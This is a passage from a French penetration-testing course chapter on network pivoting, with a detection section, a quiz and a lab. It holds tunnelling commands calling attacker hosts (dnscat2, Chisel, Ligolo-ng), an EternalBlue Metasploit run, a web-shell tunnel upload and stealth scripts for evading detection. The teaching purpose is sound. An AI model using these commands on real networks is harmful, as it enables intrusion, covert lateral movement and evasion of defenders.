   ./chisel client pivot-server:8080 R:socks
   
   # Configuration de ProxyChains
   echo "socks5 127.0.0.1 1080" > /etc/proxychains.conf
   
   # Utilisation avec différents outils
   proxychains nmap -sT -Pn 192.168.1.10
   ```

4. **Tunneling chiffré**
   ```bash
   # Sur le serveur (pivot)
   ./chisel server -p 8080 --key "votre_clé_secrète" --reverse
   
   # Sur le client (attaquant)
   ./chisel client --key "votre_clé_secrète" pivot-server:8080 R:8000:internal-server:80
   ```

#### Ligolo-ng

Ligolo-ng est un outil avancé de tunneling qui permet de créer des tunnels TCP/UDP à travers des proxies HTTP.

1. **Installation**
   ```bash
   # Téléchargement des binaires
   wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_Linux_64bit.tar.gz
   wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_Linux_64bit.tar.gz
   
   # Extraction
   tar -xzvf ligolo-ng_agent_0.4.4_Linux_64bit.tar.gz
   tar -xzvf ligolo-ng_proxy_0.4.4_Linux_64bit.tar.gz
   ```

2. **Configuration de l'interface TUN**
   ```bash
   # Sur la machine de l'attaquant
   sudo ip tuntap add user $(whoami) mode tun ligolo
   sudo ip link set ligolo up
   ```

3. **Démarrage du proxy**
   ```bash
   # Sur la machine de l'attaquant
   ./proxy -selfcert
   ```

4. **Connexion de l'agent**
   ```bash
   # Transfert de l'agent sur la cible
   # Puis sur la cible
   ./agent -connect attacker-ip:11601 -ignore-cert
   ```

5. **Configuration des routes**
   ```bash
   # Dans l'interface de ligolo-ng
   ligolo-ng » session
   ligolo-ng » session 1
   ligolo-ng » ifconfig
   ligolo-ng » ip route add 192.168.1.0/24 dev ligolo
   ligolo-ng » start
   ```

### Techniques avancées de pivoting

#### Double pivoting

Le double pivoting consiste à utiliser deux ou plusieurs systèmes compromis comme points de rebond pour atteindre des réseaux profondément segmentés.

```
Attaquant <-> Pivot 1 <-> Pivot 2 <-> Réseau cible
```

1. **Avec SSH**
   ```bash
   # Étape 1: Établir un tunnel vers le premier pivot
   ssh -D 1080 user@pivot1.example.com
   
   # Étape 2: Utiliser ProxyChains pour se connecter au deuxième pivot
   proxychains ssh -D 1081 user@pivot2.internal
   
   # Étape 3: Configuration de ProxyChains pour utiliser le deuxième proxy
   echo "socks5 127.0.0.1 1081" >> /etc/proxychains.conf
   
   # Étape 4: Accès aux ressources du réseau cible
   proxychains nmap -sT -Pn 192.168.2.0/24
   ```

2. **Avec Metasploit**
   ```
   # Étape 1: Obtenir une session Meterpreter sur le premier pivot
   # Étape 2: Ajouter une route vers le deuxième pivot
   meterpreter > run autoroute -s 192.168.1.0/24
   
   # Étape 3: Exploiter le deuxième pivot
   msf6 > use exploit/windows/smb/ms17_010_eternalblue
   msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.10
   msf6 exploit(windows/smb/ms17_010_eternalblue) > run
   
   # Étape 4: Ajouter une route vers le réseau cible depuis le deuxième pivot
   meterpreter > run autoroute -s 192.168.2.0/24
   
   # Étape 5: Démarrer un proxy SOCKS
   msf6 > use auxiliary/server/socks_proxy
   msf6 auxiliary(server/socks_proxy) > run
   
   # Étape 6: Accès aux ressources du réseau cible
   proxychains nmap -sT -Pn 192.168.2.0/24
   ```

#### Pivoting avec relais DNS

Le pivoting DNS permet de tunneler des données à travers le protocole DNS, utile lorsque d'autres protocoles sont bloqués.

1. **Avec dnscat2**
   ```bash
   # Installation sur l'attaquant
   git clone https://github.com/iagox86/dnscat2.git
   cd dnscat2/server
   gem install bundler
   bundle install
   
   # Démarrage du serveur
   ruby ./dnscat2.rb
   
   # Sur la cible
   # Transfert du client dnscat2
   # Puis exécution
   ./dnscat2 --dns domain=attacker.com,server=attacker-ip
   
   # Dans la console dnscat2
   dnscat2> window -i 1
   dnscat2> listen 127.0.0.1:8080 192.168.1.10:80
   ```

2. **Avec iodine**
   ```bash
   # Installation sur l'attaquant
   apt-get install iodine
   
   # Démarrage du serveur
   iodined -f -c -P password 10.0.0.1 tunnel.attacker.com
   
   # Sur la cible
   # Transfert de iodine
   # Puis exécution
   iodine -f -P password attacker-ip tunnel.attacker.com
   
   # Après établissement du tunnel, utilisation de SSH
   ssh -D 1080 user@10.0.0.1
   ```

#### Pivoting avec WebSockets

Les WebSockets permettent de créer des tunnels à travers des connexions HTTP/HTTPS, utiles pour contourner les pare-feu restrictifs.

1. **Avec Chisel (mode WebSocket)**
   ```bash
   # Sur le serveur (attaquant)
   ./chisel server -p 8080 --reverse
   
   # Sur le client (cible)
   ./chisel client https://attacker.com:8080 R:socks
   
   # Utilisation avec ProxyChains
   proxychains nmap -sT -Pn 192.168.1.0/24
   ```

2. **Avec reGeorg**
   ```bash
   # Téléchargement de reGeorg
   git clone https://github.com/sensepost/reGeorg.git
   cd reGeorg
   
   # Transfert du tunnel.php sur un serveur web compromis
   
   # Sur l'attaquant
   python reGeorgSocksProxy.py -p 8080 -u http://compromised-server/tunnel.php
   
   # Utilisation avec ProxyChains
   proxychains nmap -sT -Pn 192.168.1.0/24
   ```

### Vue Blue Team / logs générés / alertes SIEM

#### Traces générées par les activités de pivoting

1. **Logs de connexion SSH**
   - Connexions SSH avec options de forwarding
   - Sessions SSH de longue durée
   
   **Exemple de log SSH :**
   ```
   May 15 14:23:45 server sshd[1234]: Accepted publickey for user from 192.168.1.100 port 54321 ssh2
   May 15 14:23:45 server sshd[1234]: User user from 192.168.1.100 forwarded remote port 8080 to localhost:80
   ```

2. **Logs de connexion réseau**
   - Connexions inhabituelles entre segments réseau
   - Trafic sur des ports non standard
   - Volumes de trafic anormaux
   
   **Exemple de log Netflow :**
   ```
   2023-05-15 14:23:45 duration:3600 proto:6 src:192.168.1.100:54321 dst:10.0.0.1:22 bytes:1234567 packets:12345
   2023-05-15 14:23:45 duration:3600 proto:6 src:10.0.0.1:22 dst:192.168.1.100:54321 bytes:7654321 packets:54321
   ```

3. **Logs de pare-feu**
   - Connexions traversant plusieurs segments réseau
   - Trafic sortant vers des ports inhabituels
   
   **Exemple de log de pare-feu :**
   ```
   May 15 14:23:45 firewall kernel: ACCEPT IN=eth0 OUT=eth1 SRC=192.168.1.100 DST=10.0.0.1 PROTO=TCP SPT=54321 DPT=22 STATE=NEW
   May 15 14:23:45 firewall kernel: ACCEPT IN=eth1 OUT=eth0 SRC=10.0.0.1 DST=192.168.1.100 PROTO=TCP SPT=22 DPT=54321 STATE=ESTABLISHED
   ```

#### Détection par les systèmes de sécurité

1. **IDS/IPS**
   - Détection de tunnels SSH avec options de forwarding
   - Détection de trafic chiffré anormal
   - Détection de connexions persistantes
   
   **Exemple d'alerte Snort :**
   ```
   [**] [1:1000001:1] INDICATOR-COMPROMISE SSH tunnel detected [**]
   [Classification: Potentially Bad Traffic] [Priority: 2]
   05/15-14:23:45.123456 192.168.1.100:54321 -> 10.0.0.1:22
   TCP TTL:64 TOS:0x0 ID:12345 IpLen:20 DgmLen:1234
   ***AP*** Seq: 0x12345678 Ack: 0x87654321 Win: 0x1000 TcpLen: 20
   ```

2. **SIEM**
   - Corrélation de connexions entre segments réseau
   - Détection de patterns de pivoting connus
   - Alertes sur les connexions de longue durée
   
   **Exemple d'alerte SIEM :**
   ```
   [ALERT] Potential Pivoting Activity Detected
   Source IP: 192.168.1.100
   Target: 10.0.0.1 (SSH)
   Time: 2023-05-15 14:23:45
   Details: SSH connection with port forwarding detected, followed by internal scanning activity
   Severity: High
   ```

3. **EDR (Endpoint Detection and Response)**
   - Détection de processus de tunneling (socat, chisel, etc.)
   - Détection de connexions réseau inhabituelles
   - Détection de modifications de table de routage
   
   **Exemple d'alerte EDR :**
   ```
   [ALERT] Suspicious Process Activity
   Host: workstation01
   Process: socat
   Command Line: socat TCP-LISTEN:8080,fork TCP:192.168.1.10:80
   Time: 2023-05-15 14:30:12
   Severity: High
   ```

#### Alertes SIEM typiques

**Alerte de tunneling SSH :**
```
[ALERT] SSH Tunneling Detected
Source IP: 192.168.1.100
Target: 10.0.0.1
Time: 2023-05-15 14:23:45
Details: SSH connection with dynamic port forwarding (-D option) detected
Severity: Medium
```

**Alerte de scan post-pivoting :**
```
[ALERT] Internal Network Scanning After Pivot
Source IP: 10.0.0.1
Target: Multiple internal hosts
Time: 2023-05-15 14:35:27
Details: Host scanning activity detected from a system with an active SSH tunnel
Severity: High
```

**Alerte de trafic anormal :**
```
[ALERT] Abnormal Traffic Pattern Detected
Source IP: 10.0.0.1
Destination IP: 192.168.1.100
Time: 2023-05-15 14:40:12
Details: Sustained high-volume encrypted traffic on non-standard port
Severity: Medium
```

### Pièges classiques et erreurs à éviter

#### Erreurs techniques

1. **Configuration incorrecte des tunnels**
   - Confusion entre les options de forwarding local (-L) et distant (-R)
   - Erreurs dans les adresses IP ou les numéros de port
   - Oubli de spécifier l'adresse de liaison (bind_address)
   
   **Solution :** Testez vos tunnels avec des commandes simples comme `curl` ou `telnet` avant de les utiliser pour des opérations plus complexes.

2. **Problèmes de routage**
   - Routes manquantes ou incorrectes
   - Conflits de routes
   - Oubli de configurer le forwarding IP sur les pivots
   
   **Solution :** Vérifiez les tables de routage avec `route -n` ou `ip route show` et assurez-vous que le forwarding IP est activé avec `sysctl net.ipv4.ip_forward=1`.

3. **Problèmes de permissions**
   - Privilèges insuffisants pour créer des tunnels
   - Restrictions SSH (AllowTcpForwarding no, GatewayPorts no)
   - Pare-feu bloquant les connexions
   
   **Solution :** Vérifiez les permissions et les configurations SSH, et utilisez des outils comme `socat` ou `chisel` qui peuvent fonctionner sans privilèges élevés.

#### Erreurs OPSEC

1. **Tunnels trop bruyants**
   - Trafic volumineux à travers les tunnels
   - Scans agressifs après établissement du pivot
   - Connexions simultanées multiples
   
   **Solution :** Limitez le volume de trafic, utilisez des scans discrets et espacez vos activités dans le temps.

2. **Tunnels persistants**
   - Tunnels laissés ouverts pendant de longues périodes
   - Absence de mécanisme de timeout ou de heartbeat
   - Connexions abandonnées sans être correctement fermées
   
   **Solution :** Utilisez des tunnels temporaires, configurez des timeouts et fermez proprement les connexions après utilisation.

3. **Utilisation de ports évidents**
   - Utilisation de ports connus pour les backdoors (4444, 5555, etc.)
   - Utilisation de ports non standard mais suspects
   - Schémas de ports prévisibles
   
   **Solution :** Utilisez des ports légitimes (80, 443, 53) ou des ports qui correspondent au trafic normal de l'environnement cible.

### OPSEC Tips : tunneling discret

#### Techniques de base

1. **Utilisation de ports légitimes**
   ```bash
   # SSH sur le port HTTPS
   ssh -L 8080:192.168.1.10:80 -p 443 user@pivot.example.com
   
   # Socat sur le port HTTP
   socat TCP-LISTEN:80,fork TCP:192.168.1.10:3389
   ```

2. **Limitation du trafic**
   ```bash
   # Limitation de la bande passante avec SSH
   ssh -L 8080:192.168.1.10:80 -o IPQoS=throughput user@pivot.example.com
   
   # Limitation avec trickle
   trickle -d 100 -u 50 ssh -D 1080 user@pivot.example.com
   ```

3. **Tunnels temporaires**
   ```bash
   # SSH avec timeout
   ssh -L 8080:192.168.1.10:80 -o ConnectTimeout=30 -o ServerAliveInterval=60 -o ServerAliveCountMax=3 user@pivot.example.com
   
   # Tunnel avec durée limitée
   timeout 1h ssh -D 1080 user@pivot.example.com
   ```

#### Techniques avancées

1. **Tunneling à travers HTTPS**
   ```bash
   # Utilisation de stunnel pour encapsuler SSH dans HTTPS
   # Sur le serveur (pivot)
   cat > /etc/stunnel/stunnel.conf << EOF
   [ssh]
   accept = 443
   connect = 127.0.0.1:22
   cert = /etc/stunnel/stunnel.pem
   EOF
   stunnel
   
   # Sur le client (attaquant)
   cat > stunnel.conf << EOF
   [ssh]
   client = yes
   accept = 2222
   connect = pivot.example.com:443
   EOF
   stunnel
   
   # Connexion SSH via stunnel
   ssh -D 1080 -p 2222 user@localhost
   ```

2. **Tunneling avec obfuscation**
   ```bash
   # Utilisation de obfs4proxy avec SSH
   # Installation de obfs4proxy
   apt-get install obfs4proxy
   
   # Sur le serveur (pivot)
   obfs4proxy -enableLogging -logLevel DEBUG
   
   # Sur le client (attaquant)
   ssh -o ProxyCommand='obfs4proxy -enableLogging -logLevel DEBUG %h %p' user@pivot.example.com
   ```

3. **Rotation des tunnels**
   ```bash
   # Script de rotation de tunnels SSH
   cat > rotate_tunnels.sh << 'EOF'
   #!/bin/bash
   
   PIVOT_HOST="pivot.example.com"
   PIVOT_USER="user"
   INTERNAL_HOST="192.168.1.10"
   INTERNAL_PORT="80"
   
   # Fonction pour créer un tunnel avec un port local aléatoire
   create_tunnel() {
       local local_port=$((RANDOM % 10000 + 10000))
       echo "[+] Création d'un tunnel sur le port local $local_port"
       ssh -f -N -L $local_port:$INTERNAL_HOST:$INTERNAL_PORT $PIVOT_USER@$PIVOT_HOST
       echo $local_port
   }
   
   # Fonction pour fermer un tunnel
   close_tunnel() {
       local pid=$1
       echo "[+] Fermeture du tunnel avec PID $pid"
       kill $pid
   }
   
   # Boucle principale
   while true; do
       # Création d'un nouveau tunnel
       port=$(create_tunnel)
       pid=$(pgrep -f "ssh.*-L $port:")
       
       echo "[+] Tunnel actif sur le port $port (PID: $pid)"
       echo "[+] Utilisez http://localhost:$port pour accéder au service"
       
       # Attente aléatoire entre 30 et 90 minutes
       sleep_time=$((RANDOM % 3600 + 1800))
       echo "[+] Rotation dans $sleep_time secondes"
       sleep $sleep_time
       
       # Fermeture du tunnel actuel
       close_tunnel $pid
       
       # Pause aléatoire avant de créer un nouveau tunnel
       pause_time=$((RANDOM % 300 + 60))
       echo "[+] Pause de $pause_time secondes"
       sleep $pause_time
   done
   EOF
   
   chmod +x rotate_tunnels.sh
   ```

#### Script de tunneling OPSEC

Voici un exemple de script pour réaliser un tunneling discret :

```bash
#!/bin/bash
# stealth_tunnel.sh - Tunneling discret avec techniques OPSEC

if [ $# -lt 3 ]; then
    echo "Usage: $0 <pivot_host> <target_host> <target_port> [tunnel_type] [output_dir]"
    echo "Tunnel types: ssh, socat, chisel (default: ssh)"
    exit 1
fi

PIVOT_HOST=$1
TARGET_HOST=$2
TARGET_PORT=$3
TUNNEL_TYPE=${4:-"ssh"}
OUTPUT_DIR=${5:-"stealth_tunnel_$(date +%Y%m%d_%H%M%S)"}

mkdir -p "$OUTPUT_DIR"
echo "[+] Démarrage du tunneling discret vers $TARGET_HOST:$TARGET_PORT via $PIVOT_HOST"
echo "[+] Les résultats seront enregistrés dans $OUTPUT_DIR"

# Configuration des variables
LOCAL_PORT=$((RANDOM % 10000 + 40000))  # Port local aléatoire entre 40000 et 50000
SSH_KEY="$HOME/.ssh/id_rsa"
SSH_USER=$(whoami)
PIVOT_SSH_PORT=22
CHISEL_PORT=8080

# Fonction pour exécuter une commande avec délai aléatoire
run_cmd() {
    local cmd=$1
    local outfile=$2
    local min_delay=$3
    local max_delay=$4
    
    echo "[*] Exécution de: $cmd"
    eval "$cmd" > "$OUTPUT_DIR/$outfile" 2>&1
    local status=$?
    echo "[+] Résultats enregistrés dans $OUTPUT_DIR/$outfile"
    
    if [ $status -ne 0 ]; then
        echo "[-] Erreur lors de l'exécution de la commande"
        cat "$OUTPUT_DIR/$outfile"
    fi
    
    # Délai aléatoire
    if [ -n "$min_delay" ] && [ -n "$max_delay" ]; then
        local delay=$((RANDOM % (max_delay - min_delay + 1) + min_delay))
        echo "[*] Pause de $delay secondes..."
        sleep $delay
    fi
    
    return $status
}

# Fonction pour vérifier la connectivité
check_connectivity() {
    local host=$1
    local port=$2
    local timeout=$3
    
    echo "[*] Vérification de la connectivité vers $host:$port"
    nc -z -w $timeout $host $port
    return $?
}

# Fonction pour créer un tunnel SSH
create_ssh_tunnel() {
    echo "[*] Création d'un tunnel SSH"
    
    # Vérification de la clé SSH
    if [ ! -f "$SSH_KEY" ]; then
        echo "[*] Clé SSH non trouvée, génération d'une nouvelle clé"
        ssh-keygen -t rsa -b 4096 -f "$SSH_KEY" -N ""
    fi
    
    # Vérification de la connectivité SSH
    if ! check_connectivity $PIVOT_HOST $PIVOT_SSH_PORT 5; then
        echo "[-] Impossible de se connecter à $PIVOT_HOST:$PIVOT_SSH_PORT"
        return 1
    fi
    
    # Configuration SSH discrète
    cat > "$OUTPUT_DIR/ssh_config" << EOF
Host pivot
    HostName $PIVOT_HOST
    User $SSH_USER
    Port $PIVOT_SSH_PORT
    IdentityFile $SSH_KEY
    ServerAliveInterval 30
    ServerAliveCountMax 3
    ConnectTimeout 10
    ControlMaster auto
    ControlPath $OUTPUT_DIR/ssh_control_%h_%p_%r
    ControlPersist 10m
EOF
    
    # Création du tunnel SSH
    run_cmd "ssh -F $OUTPUT_DIR/ssh_config -N -L $LOCAL_PORT:$TARGET_HOST:$TARGET_PORT pivot &" "01_ssh_tunnel.log"
    SSH_PID=$!
    echo $SSH_PID > "$OUTPUT_DIR/ssh_pid"
    
    # Vérification que le tunnel est actif
    sleep 2
    if ! ps -p $SSH_PID > /dev/null; then
        echo "[-] Le tunnel SSH n'a pas pu être établi"
        return 1
    fi
    
    echo "[+] Tunnel SSH établi sur le port local $LOCAL_PORT (PID: $SSH_PID)"
    return 0
}

# Fonction pour créer un tunnel Socat
create_socat_tunnel() {
    echo "[*] Création d'un tunnel Socat"
    
    # Vérification de l'installation de socat
    if ! command -v socat &> /dev/null; then
        echo "[*] Socat non trouvé, installation..."
        run_cmd "apt-get update && apt-get install -y socat" "01_socat_install.log"
    fi
    
    # Vérification de la connectivité SSH (pour transférer socat si nécessaire)
    if ! check_connectivity $PIVOT_HOST $PIVOT_SSH_PORT 5; then
        echo "[-] Impossible de se connecter à $PIVOT_HOST:$PIVOT_SSH_PORT"
        return 1
    fi
    
    # Création d'un script socat pour le pivot
    cat > "$OUTPUT_DIR/socat_pivot.sh" << EOF
#!/bin/bash
# Vérification de l'installation de socat
if ! command -v socat &> /dev/null; then
    echo "[-] Socat non trouvé, installation..."
    apt-get update && apt-get install -y socat
fi

# Démarrage de socat
socat TCP-LISTEN:$CHISEL_PORT,fork TCP:$TARGET_HOST:$TARGET_PORT &
echo \$! > socat_pid.txt
echo "[+] Socat démarré sur le port $CHISEL_PORT (PID: \$(cat socat_pid.txt))"
EOF
    
    # Transfert et exécution du script sur le pivot
    run_cmd "scp -F $OUTPUT_DIR/ssh_config $OUTPUT_DIR/socat_pivot.sh pivot:/tmp/" "02_socat_transfer.log"
    run_cmd "ssh -F $OUTPUT_DIR/ssh_config pivot 'chmod +x /tmp/socat_pivot.sh && /tmp/socat_pivot.sh'" "03_socat_start.log"
    
    # Création du tunnel SSH vers le tunnel socat
    run_cmd "ssh -F $OUTPUT_DIR/ssh_config -N -L $LOCAL_PORT:localhost:$CHISEL_PORT pivot &" "04_ssh_to_socat.log"
    SSH_PID=$!
    echo $SSH_PID > "$OUTPUT_DIR/ssh_pid"
    
    # Vérification que le tunnel est actif
    sleep 2
    if ! ps -p $SSH_PID > /dev/null; then
        echo "[-] Le tunnel SSH vers socat n'a pas pu être établi"
        return 1
    fi
    
    echo "[+] Tunnel Socat établi sur le port local $LOCAL_PORT (PID: $SSH_PID)"
    return 0
}

# Fonction pour créer un tunnel Chisel
create_chisel_tunnel() {
    echo "[*] Création d'un tunnel Chisel"
    
    # Vérification/téléchargement de chisel
    if [ ! -f "$OUTPUT_DIR/chisel" ]; then
        echo "[*] Chisel non trouvé, téléchargement..."
        run_cmd "wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz -O $OUTPUT_DIR/chisel.gz" "01_chisel_download.log"
        run_cmd "gzip -d $OUTPUT_DIR/chisel.gz" "02_chisel_extract.log"
        run_cmd "chmod +x $OUTPUT_DIR/chisel" "03_chisel_chmod.log"
    fi
    
    # Vérification de la connectivité SSH (pour transférer chisel)
    if ! check_connectivity $PIVOT_HOST $PIVOT_SSH_PORT 5; then
        echo "[-] Impossible de se connecter à $PIVOT_HOST:$PIVOT_SSH_PORT"
        return 1
    fi
    
    # Transfert de chisel sur le pivot
    run_cmd "scp -F $OUTPUT_DIR/ssh_config $OUTPUT_DIR/chisel pivot:/tmp/" "04_chisel_transfer.log"
    
    # Démarrage du serveur chisel sur le pivot
    run_cmd "ssh -F $OUTPUT_DIR/ssh_config pivot 'chmod +x /tmp/chisel && /tmp/chisel server -p $CHISEL_PORT --reverse &> /tmp/chisel_server.log &'" "05_chisel_server.log"
    
    # Attente que le serveur soit prêt
    sleep 5
    
    # Démarrage du client chisel
    run_cmd "$OUTPUT_DIR/chisel client $PIVOT_HOST:$CHISEL_PORT R:$LOCAL_PORT:$TARGET_HOST:$TARGET_PORT &" "06_chisel_client.log"
    CHISEL_PID=$!
    echo $CHISEL_PID > "$OUTPUT_DIR/chisel_pid"
    
    # Vérification que le tunnel est actif
    sleep 2
    if ! ps -p $CHISEL_PID > /dev/null; then
        echo "[-] Le tunnel Chisel n'a pas pu être établi"
        return 1
    fi
    
    echo "[+] Tunnel Chisel établi sur le port local $LOCAL_PORT (PID: $CHISEL_PID)"
    return 0
}

# Fonction pour tester le tunnel
test_tunnel() {
    echo "[*] Test du tunnel sur localhost:$LOCAL_PORT"
    
    # Attente que le tunnel soit prêt
    sleep 2
    
    # Test de connectivité
    if ! check_connectivity localhost $LOCAL_PORT 5; then
        echo "[-] Impossible de se connecter au tunnel sur localhost:$LOCAL_PORT"
        return 1
    fi
    
    # Test spécifique selon le port cible
    case $TARGET_PORT in
        80|443)
            # Test HTTP/HTTPS
            run_cmd "curl -s -o $OUTPUT_DIR/test_result.html -w '%{http_code}' http://localhost:$LOCAL_PORT/" "07_tunnel_test_http.log"
            HTTP_CODE=$(cat "$OUTPUT_DIR/07_tunnel_test_http.log")
            if [[ "$HTTP_CODE" =~ ^[23] ]]; then
                echo "[+] Test HTTP réussi (code: $HTTP_CODE)"
            else
                echo "[-] Test HTTP échoué (code: $HTTP_CODE)"
                return 1
            fi
            ;;
        22)
            # Test SSH
            run_cmd "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p $LOCAL_PORT localhost exit" "07_tunnel_test_ssh.log"
            if [ $? -eq 0 ]; then
                echo "[+] Test SSH réussi"
            else
                echo "[-] Test SSH échoué"
                return 1
            fi
            ;;
        *)
            # Test générique
            run_cmd "nc -z -v localhost $LOCAL_PORT" "07_tunnel_test_generic.log"
            if [ $? -eq 0 ]; then
                echo "[+] Test de connectivité réussi"
            else
                echo "[-] Test de connectivité échoué"
                return 1
            fi
            ;;
    esac
    
    return 0
}

# Fonction pour nettoyer les tunnels
cleanup_tunnels() {
    echo "[*] Nettoyage des tunnels"
    
    # Nettoyage SSH
    if [ -f "$OUTPUT_DIR/ssh_pid" ]; then
        SSH_PID=$(cat "$OUTPUT_DIR/ssh_pid")
        if ps -p $SSH_PID > /dev/null; then
            echo "[*] Arrêt du tunnel SSH (PID: $SSH_PID)"
            kill $SSH_PID
        fi
    fi
    
    # Nettoyage Chisel
    if [ -f "$OUTPUT_DIR/chisel_pid" ]; then
        CHISEL_PID=$(cat "$OUTPUT_DIR/chisel_pid")
        if ps -p $CHISEL_PID > /dev/null; then
            echo "[*] Arrêt du client Chisel (PID: $CHISEL_PID)"
            kill $CHISEL_PID
        fi
    fi
    
    # Nettoyage sur le pivot
    if [ -f "$OUTPUT_DIR/ssh_config" ]; then
        echo "[*] Nettoyage sur le pivot"
        ssh -F "$OUTPUT_DIR/ssh_config" pivot 'pkill -f chisel; pkill -f socat; rm -f /tmp/chisel /tmp/socat_pivot.sh /tmp/chisel_server.log /tmp/socat_pid.txt' &> /dev/null
    fi
    
    echo "[+] Nettoyage terminé"
}

# Enregistrement du signal d'arrêt
trap cleanup_tunnels EXIT

# Phase 1: Création du tunnel selon le type spécifié
echo "[*] Phase 1: Création du tunnel ($TUNNEL_TYPE)..."

case "$TUNNEL_TYPE" in
    ssh)
        create_ssh_tunnel
        ;;
    socat)
        create_socat_tunnel
        ;;
    chisel)
        create_chisel_tunnel
        ;;
    *)
        echo "[-] Type de tunnel non reconnu: $TUNNEL_TYPE"
        echo "[-] Types supportés: ssh, socat, chisel"
        exit 1
        ;;
esac

if [ $? -ne 0 ]; then
    echo "[-] Échec de la création du tunnel"
    cleanup_tunnels
    exit 1
fi

# Phase 2: Test du tunnel
echo "[*] Phase 2: Test du tunnel..."
test_tunnel

if [ $? -ne 0 ]; then
    echo "[-] Échec du test du tunnel"
    cleanup_tunnels
    exit 1
fi

# Phase 3: Instructions d'utilisation
echo "[*] Phase 3: Instructions d'utilisation..."

cat > "$OUTPUT_DIR/usage_instructions.txt" << EOF
# Instructions d'utilisation du tunnel

## Informations du tunnel
- Type de tunnel: $TUNNEL_TYPE
- Pivot: $PIVOT_HOST
- Cible: $TARGET_HOST:$TARGET_PORT
- Port local: $LOCAL_PORT

## Utilisation du tunnel
- Pour les services HTTP/HTTPS: http://localhost:$LOCAL_PORT
- Pour SSH: ssh -p $LOCAL_PORT localhost
- Pour d'autres services: nc localhost $LOCAL_PORT

## Avec ProxyChains (pour les tunnels SOCKS)
- Ajoutez "socks5 127.0.0.1 $LOCAL_PORT" à /etc/proxychains.conf
- Utilisez: proxychains <commande>

## Arrêt du tunnel
- Exécutez: kill $(cat "$OUTPUT_DIR/ssh_pid" 2>/dev/null || cat "$OUTPUT_DIR/chisel_pid" 2>/dev/null)
- Ou utilisez: pkill -f "ssh -F $OUTPUT_DIR/ssh_config" || pkill -f "chisel client"

## Nettoyage complet
- Exécutez: $0 cleanup
EOF

echo "[+] Tunnel établi avec succès sur le port local $LOCAL_PORT"
echo "[+] Instructions d'utilisation disponibles dans $OUTPUT_DIR/usage_instructions.txt"
echo "[+] Pour arrêter le tunnel et nettoyer, appuyez sur Ctrl+C"

# Maintien du script en vie jusqu'à interruption
while true; do
    sleep 60
done
```

### Points clés

- Le pivoting et le tunneling sont des techniques essentielles pour progresser latéralement dans un réseau segmenté.
- SSH offre des fonctionnalités puissantes de port forwarding local, distant et de proxy dynamique (SOCKS).
- Des outils spécialisés comme Socat, Chisel et Ligolo-ng permettent de créer des tunnels dans des environnements où SSH n'est pas disponible.
- Les techniques avancées comme le double pivoting, le relais DNS et les WebSockets permettent de contourner des restrictions réseau complexes.
- Les activités de pivoting génèrent des traces détectables par les équipes de sécurité défensive.
- Des techniques OPSEC appropriées, comme l'utilisation de ports légitimes et la limitation du trafic, permettent de réduire la détectabilité des tunnels.

### Mini-quiz (3 QCM)

1. **Quelle commande SSH permet de créer un proxy SOCKS sur le port local 1080 ?**
   - A) `ssh -L 1080:localhost:22 user@pivot.example.com`
   - B) `ssh -R 1080:localhost:22 user@pivot.example.com`
   - C) `ssh -D 1080 user@pivot.example.com`
   - D) `ssh -N 1080 user@pivot.example.com`

   *Réponse : C*

2. **Quelle technique de pivoting est la plus discrète du point de vue OPSEC ?**
   - A) Utilisation de Metasploit avec un proxy SOCKS sur le port 1080
   - B) Tunneling DNS avec rotation périodique des connexions
   - C) Port forwarding SSH direct sur des ports standards (80, 443)
   - D) Scan Nmap à travers un tunnel SSH

   *Réponse : B*

3. **Quelle trace est générée par les activités de pivoting et détectable par les équipes défensives ?**
   - A) Connexions SSH avec options de forwarding dans les logs
   - B) Trafic chiffré anormal entre segments réseau
   - C) Processus de tunneling (socat, chisel) sur les systèmes compromis
   - D) Toutes les réponses ci-dessus

   *Réponse : D*

### Lab/Exercice guidé : Pivoting à travers plusieurs segments réseau

#### Objectif
Établir un pivot à travers deux segments réseau pour accéder à un serveur web interne, en utilisant des techniques OPSEC pour minimiser la détection.

#### Prérequis
- Kali Linux
- Trois machines virtuelles (pivot externe, pivot interne, serveur web cible)
- Réseau segmenté (externe, DMZ, interne)

#### Topologie du réseau
```
Attaquant (192.168.0.100) <-> Pivot externe (192.168.0.10 / 10.0.0.10) <-> Pivot interne (10.0.0.20 / 172.16.0.20) <-> Serveur web (172.16.0.30)
```

#### Étapes

1. **Préparation de l'environnement**

```bash
# Création du répertoire de travail
mkdir -p ~/pentest_labs/pivoting_lab
cd ~/pentest_labs/pivoting_lab

# Vérification de la connectivité avec le pivot externe
ping -c 1 192.168.0.10
```

2. **Reconnaissance initiale**

```bash
# Scan du pivot externe
nmap -sS -T2 -p 22,80,443 192.168.0.10 -oN pivot_externe_scan.txt

# Connexion SSH au pivot externe
ssh user@192.168.0.10

# Sur le pivot externe, reconnaissance du réseau DMZ
ip addr show
ip route show
ping -c 1 10.0.0.20
```

3. **Premier pivot : SSH vers le pivot externe**

```bash
# Création d'un tunnel SSH avec proxy dynamique
ssh -D 1080 user@192.168.0.10

# Configuration de ProxyChains
cat > /etc/proxychains.conf << EOF
# ProxyChains configuration
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
EOF

# Test du proxy
proxychains curl http://10.0.0.20
```

4. **Deuxième pivot : Accès au pivot interne**

```bash
# Scan du pivot interne via le premier pivot
proxychains nmap -sT -Pn -p 22,80,443 10.0.0.20 -oN pivot_interne_scan.txt

# Création d'un tunnel SSH vers le pivot interne
ssh -L 2222:10.0.0.20:22 user@192.168.0.10

# Connexion SSH au pivot interne via le tunnel
ssh -p 2222 user@localhost

# Sur le pivot interne, reconnaissance du réseau interne
ip addr show
ip route show
ping -c 1 172.16.0.30
```

5. **Configuration du double pivot**

```bash
# Méthode 1: Chaînage de tunnels SSH
# Sur l'attaquant, création d'un tunnel vers le pivot interne
ssh -L 2222:10.0.0.20:22 user@192.168.0.10

# Puis création d'un proxy SOCKS via le pivot interne
ssh -D 1081 -p 2222 user@localhost

# Configuration de ProxyChains pour utiliser le deuxième proxy
cat >> /etc/proxychains.conf << EOF
socks5 127.0.0.1 1081
EOF

# Méthode 2: Utilisation de ProxyJump (SSH 7.3+)
cat >> ~/.ssh/config << EOF
Host pivot-externe
    HostName 192.168.0.10
    User user
